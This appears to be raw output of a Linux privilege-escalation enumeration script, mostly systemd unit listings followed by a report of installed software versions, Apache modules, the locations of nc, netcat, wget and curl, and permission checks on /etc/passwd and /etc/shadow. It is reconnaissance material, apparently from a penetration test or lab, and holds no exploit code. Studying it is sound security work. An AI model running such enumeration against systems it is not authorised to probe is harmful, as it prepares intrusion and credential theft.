lrwxrwxrwx 1 root root    9 Oct 27  2017 fuse.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Oct 27  2017 kmod.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root   28 Oct 27  2017 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Oct 27  2017 procps.service -> systemd-sysctl.service
lrwxrwxrwx 1 root root   16 Oct 27  2017 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 reboot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root   15 Oct 27  2017 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Oct 27  2017 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Oct 27  2017 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Oct 27  2017 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Oct 27  2017 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Oct 27  2017 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Oct 27  2017 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Oct 27  2017 sendsigs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 27  2017 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Oct 27  2017 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Oct 27  2017 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  770 Oct 27  2017 console-getty.service
-rw-r--r-- 1 root root  742 Oct 27  2017 console-shell.service
-rw-r--r-- 1 root root  791 Oct 27  2017 container-getty@.service
-rw-r--r-- 1 root root 1010 Oct 27  2017 debug-shell.service
-rw-r--r-- 1 root root 1009 Oct 27  2017 emergency.service
-rw-r--r-- 1 root root 1.5K Oct 27  2017 getty@.service
-rw-r--r-- 1 root root  630 Oct 27  2017 initrd-cleanup.service
-rw-r--r-- 1 root root  790 Oct 27  2017 initrd-parse-etc.service
-rw-r--r-- 1 root root  640 Oct 27  2017 initrd-switch-root.service
-rw-r--r-- 1 root root  664 Oct 27  2017 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  677 Oct 27  2017 kmod-static-nodes.service
-rw-r--r-- 1 root root  473 Oct 27  2017 mail-transport-agent.target
-rw-r--r-- 1 root root  568 Oct 27  2017 quotaon.service
-rw-r--r-- 1 root root  612 Oct 27  2017 rc-local.service
-rw-r--r-- 1 root root  978 Oct 27  2017 rescue.service
-rw-r--r-- 1 root root 1.1K Oct 27  2017 serial-getty@.service
-rw-r--r-- 1 root root  653 Oct 27  2017 systemd-ask-password-console.service
-rw-r--r-- 1 root root  681 Oct 27  2017 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  724 Oct 27  2017 systemd-backlight@.service
-rw-r--r-- 1 root root  959 Oct 27  2017 systemd-binfmt.service
-rw-r--r-- 1 root root  650 Oct 27  2017 systemd-bootchart.service
-rw-r--r-- 1 root root 1.0K Oct 27  2017 systemd-bus-proxyd.service
-rw-r--r-- 1 root root  497 Oct 27  2017 systemd-exit.service
-rw-r--r-- 1 root root  674 Oct 27  2017 systemd-fsck-root.service
-rw-r--r-- 1 root root  648 Oct 27  2017 systemd-fsck@.service
-rw-r--r-- 1 root root  551 Oct 27  2017 systemd-fsckd.service
-rw-r--r-- 1 root root  544 Oct 27  2017 systemd-halt.service
-rw-r--r-- 1 root root  631 Oct 27  2017 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 Oct 27  2017 systemd-hibernate.service
-rw-r--r-- 1 root root  710 Oct 27  2017 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 Oct 27  2017 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 Oct 27  2017 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 Oct 27  2017 systemd-initctl.service
-rw-r--r-- 1 root root  731 Oct 27  2017 systemd-journal-flush.service
-rw-r--r-- 1 root root 1.3K Oct 27  2017 systemd-journald.service
-rw-r--r-- 1 root root  557 Oct 27  2017 systemd-kexec.service
-rw-r--r-- 1 root root  691 Oct 27  2017 systemd-localed.service
-rw-r--r-- 1 root root 1.2K Oct 27  2017 systemd-logind.service
-rw-r--r-- 1 root root  693 Oct 27  2017 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 Oct 27  2017 systemd-modules-load.service
-rw-r--r-- 1 root root  685 Oct 27  2017 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root 1.3K Oct 27  2017 systemd-networkd.service
-rw-r--r-- 1 root root  553 Oct 27  2017 systemd-poweroff.service
-rw-r--r-- 1 root root  614 Oct 27  2017 systemd-quotacheck.service
-rw-r--r-- 1 root root  717 Oct 27  2017 systemd-random-seed.service
-rw-r--r-- 1 root root  548 Oct 27  2017 systemd-reboot.service
-rw-r--r-- 1 root root  757 Oct 27  2017 systemd-remount-fs.service
-rw-r--r-- 1 root root  907 Oct 27  2017 systemd-resolved.service
-rw-r--r-- 1 root root  696 Oct 27  2017 systemd-rfkill.service
-rw-r--r-- 1 root root  497 Oct 27  2017 systemd-suspend.service
-rw-r--r-- 1 root root  649 Oct 27  2017 systemd-sysctl.service
-rw-r--r-- 1 root root  655 Oct 27  2017 systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Oct 27  2017 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 Oct 27  2017 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  703 Oct 27  2017 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 Oct 27  2017 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  823 Oct 27  2017 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 Oct 27  2017 systemd-udev-trigger.service
-rw-r--r-- 1 root root  825 Oct 27  2017 systemd-udevd.service
-rw-r--r-- 1 root root  757 Oct 27  2017 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 Oct 27  2017 systemd-update-utmp.service
-rw-r--r-- 1 root root  573 Oct 27  2017 systemd-user-sessions.service
-rw-r--r-- 1 root root  528 Oct 27  2017 user@.service
-rw-r--r-- 1 root root  403 Oct 27  2017 -.slice
-rw-r--r-- 1 root root  879 Oct 27  2017 basic.target
-rw-r--r-- 1 root root  379 Oct 27  2017 bluetooth.target
-rw-r--r-- 1 root root  358 Oct 27  2017 busnames.target
-rw-r--r-- 1 root root  394 Oct 27  2017 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Oct 27  2017 cryptsetup.target
-rw-r--r-- 1 root root  670 Oct 27  2017 dev-hugepages.mount
-rw-r--r-- 1 root root  624 Oct 27  2017 dev-mqueue.mount
-rw-r--r-- 1 root root  431 Oct 27  2017 emergency.target
-rw-r--r-- 1 root root  501 Oct 27  2017 exit.target
-rw-r--r-- 1 root root  440 Oct 27  2017 final.target
-rw-r--r-- 1 root root  460 Oct 27  2017 getty.target
-rw-r--r-- 1 root root  558 Oct 27  2017 graphical.target
-rw-r--r-- 1 root root  487 Oct 27  2017 halt.target
-rw-r--r-- 1 root root  447 Oct 27  2017 hibernate.target
-rw-r--r-- 1 root root  468 Oct 27  2017 hybrid-sleep.target
-rw-r--r-- 1 root root  553 Oct 27  2017 initrd-fs.target
-rw-r--r-- 1 root root  526 Oct 27  2017 initrd-root-fs.target
-rw-r--r-- 1 root root  691 Oct 27  2017 initrd-switch-root.target
-rw-r--r-- 1 root root  671 Oct 27  2017 initrd.target
-rw-r--r-- 1 root root  501 Oct 27  2017 kexec.target
-rw-r--r-- 1 root root  395 Oct 27  2017 local-fs-pre.target
-rw-r--r-- 1 root root  507 Oct 27  2017 local-fs.target
-rw-r--r-- 1 root root  405 Oct 27  2017 machine.slice
-rw-r--r-- 1 root root  492 Oct 27  2017 multi-user.target
-rw-r--r-- 1 root root  464 Oct 27  2017 network-online.target
-rw-r--r-- 1 root root  461 Oct 27  2017 network-pre.target
-rw-r--r-- 1 root root  480 Oct 27  2017 network.target
-rw-r--r-- 1 root root  514 Oct 27  2017 nss-lookup.target
-rw-r--r-- 1 root root  473 Oct 27  2017 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Oct 27  2017 paths.target
-rw-r--r-- 1 root root  552 Oct 27  2017 poweroff.target
-rw-r--r-- 1 root root  377 Oct 27  2017 printer.target
-rw-r--r-- 1 root root  693 Oct 27  2017 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Oct 27  2017 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  543 Oct 27  2017 reboot.target
-rw-r--r-- 1 root root  396 Oct 27  2017 remote-fs-pre.target
-rw-r--r-- 1 root root  482 Oct 27  2017 remote-fs.target
-rw-r--r-- 1 root root  486 Oct 27  2017 rescue.target
-rw-r--r-- 1 root root  500 Oct 27  2017 rpcbind.target
-rw-r--r-- 1 root root  402 Oct 27  2017 shutdown.target
-rw-r--r-- 1 root root  362 Oct 27  2017 sigpwr.target
-rw-r--r-- 1 root root  420 Oct 27  2017 sleep.target
-rw-r--r-- 1 root root  409 Oct 27  2017 slices.target
-rw-r--r-- 1 root root  380 Oct 27  2017 smartcard.target
-rw-r--r-- 1 root root  356 Oct 27  2017 sockets.target
-rw-r--r-- 1 root root  380 Oct 27  2017 sound.target
-rw-r--r-- 1 root root  441 Oct 27  2017 suspend.target
-rw-r--r-- 1 root root  353 Oct 27  2017 swap.target
-rw-r--r-- 1 root root  715 Oct 27  2017 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  719 Oct 27  2017 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Oct 27  2017 sys-kernel-debug.mount
-rw-r--r-- 1 root root  518 Oct 27  2017 sysinit.target
-rw-r--r-- 1 root root 1.3K Oct 27  2017 syslog.socket
-rw-r--r-- 1 root root  585 Oct 27  2017 system-update.target
-rw-r--r-- 1 root root  436 Oct 27  2017 system.slice
-rw-r--r-- 1 root root  646 Oct 27  2017 systemd-ask-password-console.path
-rw-r--r-- 1 root root  574 Oct 27  2017 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  409 Oct 27  2017 systemd-bus-proxyd.socket
-rw-r--r-- 1 root root  540 Oct 27  2017 systemd-fsckd.socket
-rw-r--r-- 1 root root  524 Oct 27  2017 systemd-initctl.socket
-rw-r--r-- 1 root root  607 Oct 27  2017 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.1K Oct 27  2017 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  842 Oct 27  2017 systemd-journald.socket
-rw-r--r-- 1 root root  591 Oct 27  2017 systemd-networkd.socket
-rw-r--r-- 1 root root  617 Oct 27  2017 systemd-rfkill.socket
-rw-r--r-- 1 root root  450 Oct 27  2017 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  578 Oct 27  2017 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 Oct 27  2017 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  395 Oct 27  2017 time-sync.target
-rw-r--r-- 1 root root  405 Oct 27  2017 timers.target
-rw-r--r-- 1 root root  417 Oct 27  2017 umount.target
-rw-r--r-- 1 root root  392 Oct 27  2017 user.slice
-rw-r--r-- 1 root root  342 Oct 27  2017 getty-static.service
-rw-r--r-- 1 root root  153 Oct 27  2017 sigpwr-container-shutdown.service
-rw-r--r-- 1 root root  175 Oct 27  2017 systemd-networkd-resolvconf-update.path
-rw-r--r-- 1 root root  715 Oct 27  2017 systemd-networkd-resolvconf-update.service
-rw-r--r-- 1 root root  420 Oct 23  2017 resolvconf.service
lrwxrwxrwx 1 root root   27 Sep 13  2017 plymouth-log.service -> plymouth-read-write.service
lrwxrwxrwx 1 root root   21 Sep 13  2017 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  412 Sep 13  2017 plymouth-halt.service
-rw-r--r-- 1 root root  426 Sep 13  2017 plymouth-kexec.service
-rw-r--r-- 1 root root  421 Sep 13  2017 plymouth-poweroff.service
-rw-r--r-- 1 root root  200 Sep 13  2017 plymouth-quit-wait.service
-rw-r--r-- 1 root root  194 Sep 13  2017 plymouth-quit.service
-rw-r--r-- 1 root root  244 Sep 13  2017 plymouth-read-write.service
-rw-r--r-- 1 root root  416 Sep 13  2017 plymouth-reboot.service
-rw-r--r-- 1 root root  532 Sep 13  2017 plymouth-start.service
-rw-r--r-- 1 root root  291 Sep 13  2017 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 Sep 13  2017 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 Sep 13  2017 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  386 Aug  9  2017 php7.0-fpm.service
drwxr-xr-x 2 root root 4.0K Aug  1  2017 busnames.target.wants
-rw-r--r-- 1 root root  202 Jun 19  2017 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Jun 19  2017 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  169 Jun 19  2017 apt-daily.service
-rw-r--r-- 1 root root  212 Jun 19  2017 apt-daily.timer
-rw-r--r-- 1 root root  189 Jun 15  2017 uuidd.service
-rw-r--r-- 1 root root  126 Jun 15  2017 uuidd.socket
-rw-r--r-- 1 root root  345 Apr 20  2017 unattended-upgrades.service
-rw-r--r-- 1 root root  385 Mar 16  2017 ssh.service
-rw-r--r-- 1 root root  216 Mar 16  2017 ssh.socket
-rw-r--r-- 1 root root  196 Mar 16  2017 ssh@.service
-rw-r--r-- 1 root root  411 Feb  3  2017 mysql.service
-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service
-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service
-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket
-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service
-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service
-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service
-rw-r--r-- 1 root root  251 Sep 18  2016 open-vm-tools.service
-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service
-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service
lrwxrwxrwx 1 root root    9 Apr 16  2016 lvm2.service -> /dev/null
-rw-r--r-- 1 root root  334 Apr 16  2016 dm-event.service
-rw-r--r-- 1 root root  248 Apr 16  2016 dm-event.socket
-rw-r--r-- 1 root root  380 Apr 16  2016 lvm2-lvmetad.service
-rw-r--r-- 1 root root  215 Apr 16  2016 lvm2-lvmetad.socket
-rw-r--r-- 1 root root  335 Apr 16  2016 lvm2-lvmpolld.service
-rw-r--r-- 1 root root  213 Apr 16  2016 lvm2-lvmpolld.socket
-rw-r--r-- 1 root root  658 Apr 16  2016 lvm2-monitor.service
-rw-r--r-- 1 root root  382 Apr 16  2016 lvm2-pvscan@.service
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants
-rw-r--r-- 1 root root  234 Apr  9  2016 acpid.service
-rw-r--r-- 1 root root  251 Apr  6  2016 cron.service
-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service
-rw-r--r-- 1 root root  142 Mar 31  2016 apport-forward@.service
-rw-r--r-- 1 root root  455 Mar 29  2016 iscsid.service
-rw-r--r-- 1 root root 1.1K Mar 29  2016 open-iscsi.service
-rw-r--r-- 1 root root  115 Feb 10  2016 acpid.socket
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.path
-rw-r--r-- 1 root root  169 Jan 15  2016 atd.service
-rw-r--r-- 1 root root  182 Jan 14  2016 polkitd.service
-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service
-rw-r--r-- 1 root root  241 Mar  3  2015 ufw.service
-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer
-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Sep 13  2017 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Sep 13  2017 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Oct 27  2017 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Oct 27  2017 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Oct 27  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 29 Sep 13  2017 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 24 Sep 13  2017 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -> ../dbus.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 28 Sep 13  2017 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 26 Sep 13  2017 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Nov 27  2017 console-setup.service -> ../console-setup.service
lrwxrwxrwx 1 root root 25 Nov 27  2017 keyboard-setup.service -> ../keyboard-setup.service
lrwxrwxrwx 1 root root 19 Nov 27  2017 setvtrgb.service -> ../setvtrgb.service
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 24 Oct 27  2017 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 20 Oct 27  2017 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Oct 27  2017 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Oct 27  2017 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Oct 27  2017 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Oct 27  2017 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Oct 27  2017 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Oct 27  2017 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Oct 27  2017 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Oct 27  2017 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 32 Oct 27  2017 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 27 Oct 27  2017 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 36 Oct 27  2017 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Oct 27  2017 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Oct 27  2017 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Sep 13  2017 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Oct 27  2017 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 25 Oct 27  2017 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Oct 27  2017 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Oct 27  2017 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Oct 27  2017 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -> ../dbus.socket

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Oct 27  2017 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Oct 27  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Oct 27  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/resolvconf.service.wants:
total 0
lrwxrwxrwx 1 root root 42 Oct 27  2017 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path

/lib/systemd/system/sigpwr.target.wants:
total 0
lrwxrwxrwx 1 root root 36 Oct 27  2017 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Oct 27  2017 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Oct 27  2017 debian.conf

/lib/systemd/system/systemd-resolved.service.d:
total 4.0K
-rw-r--r-- 1 root root 200 Oct 27  2017 resolvconf.conf

/lib/systemd/system/systemd-timesyncd.service.d:
total 4.0K
-rw-r--r-- 1 root root 251 Oct 27  2017 disable-with-time-daemon.conf

/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Apr 12  2016 apache2-systemd.conf

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-shutdown:
total 4.0K
-rwxr-xr-x 1 root root 160 Nov  8  2017 mdadm.shutdown

/lib/systemd/network:
total 12K
-rw-r--r-- 1 root root 404 Oct 27  2017 80-container-host0.network
-rw-r--r-- 1 root root 482 Oct 27  2017 80-container-ve.network
-rw-r--r-- 1 root root  80 Oct 27  2017 99-default.link

/lib/systemd/system-generators:
total 684K
-rwxr-xr-x 1 root root  802 Nov  8  2017 postgresql-generator
-rwxr-xr-x 1 root root  71K Oct 27  2017 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  59K Oct 27  2017 systemd-dbus1-generator
-rwxr-xr-x 1 root root  43K Oct 27  2017 systemd-debug-generator
-rwxr-xr-x 1 root root  79K Oct 27  2017 systemd-fstab-generator
-rwxr-xr-x 1 root root  39K Oct 27  2017 systemd-getty-generator
-rwxr-xr-x 1 root root 119K Oct 27  2017 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  39K Oct 27  2017 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  39K Oct 27  2017 systemd-insserv-generator
-rwxr-xr-x 1 root root  35K Oct 27  2017 systemd-rc-local-generator
-rwxr-xr-x 1 root root  31K Oct 27  2017 systemd-system-update-generator
-rwxr-xr-x 1 root root 103K Oct 27  2017 systemd-sysv-generator
-rwxr-xr-x 1 root root  11K Apr 16  2016 lvm2-activation-generator

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 869 Oct 27  2017 90-systemd.preset

/lib/systemd/system-sleep:
total 4.0K
-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.16


[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.7.21, for Linux (x86_64) using  EditLine wrapper


[-] Postgres version:
psql (PostgreSQL) 9.5.10


[-] Apache version:
Server version: Apache/2.4.18 (Ubuntu)
Server built:   2017-09-18T15:09:02


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 setenvif_module (shared)
 status_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1729 Jan 15 02:54 /etc/passwd
-rw-r--r-- 1 root root 885 Jan 18 14:14 /etc/group
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
-rw-r----- 1 root shadow 1221 Jan 15 01:58 /etc/shadow


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 100 Jan 10  2017 /etc/sos.conf
-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 350 Nov 27  2017 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 8464 Nov 27  2017 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 10368 Oct  2  2015 /etc/sensors3.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 6920 Jan 11 07:42 /etc/overlayroot.conf
